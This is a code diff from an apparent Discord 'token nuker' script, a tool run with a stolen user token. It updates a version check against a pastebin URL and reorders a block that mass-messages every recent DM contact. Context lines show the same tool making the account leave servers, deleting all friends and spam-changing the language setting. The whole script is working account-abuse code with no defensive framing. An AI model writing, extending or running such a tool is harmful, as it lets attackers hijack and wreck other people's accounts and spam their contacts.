@@ -6,7 +6,7 @@ from datetime import datetime
 from itertools import cycle
 
 def version():
-    currentversion = 2
+    currentversion = 3
     print("Checking if you have the latest version.")
     ver = urllib.request.urlopen("https://pastebin.com/raw/3JcRd4MC")
     for line in ver:
@@ -103,6 +103,16 @@ def tokenFuck(token):
     langspam = input('Would you like to spam change the user\'s language. y/n > ')
     print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
 
+    if sendall.lower() == 'y':
+        try:
+            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
+            for id in privatechannelIds:
+                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
+                print(f'Sent message to private channel ID of {id}')
+                time.sleep(1)
+        except Exception as e:
+            print(f'Error detected, ignoring. {e}')
+
     if gleave.lower() == 'y':
         try:
             for guild in guildsIds:
@@ -116,16 +126,6 @@ def tokenFuck(token):
             for friend in friendsIds:
                 requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                 print(f'Removed friend {friend}')
-        except Exception as e:
-            print(f'Error detected, ignoring. {e}')
-
-    if sendall.lower() == 'y':
-        try:
-            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
-            for id in privatechannelIds:
-                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
-                print(f'Sent message to private channel ID of {id}')
-                time.sleep(1)
         except Exception as e:
             print(f'Error detected, ignoring. {e}')
 
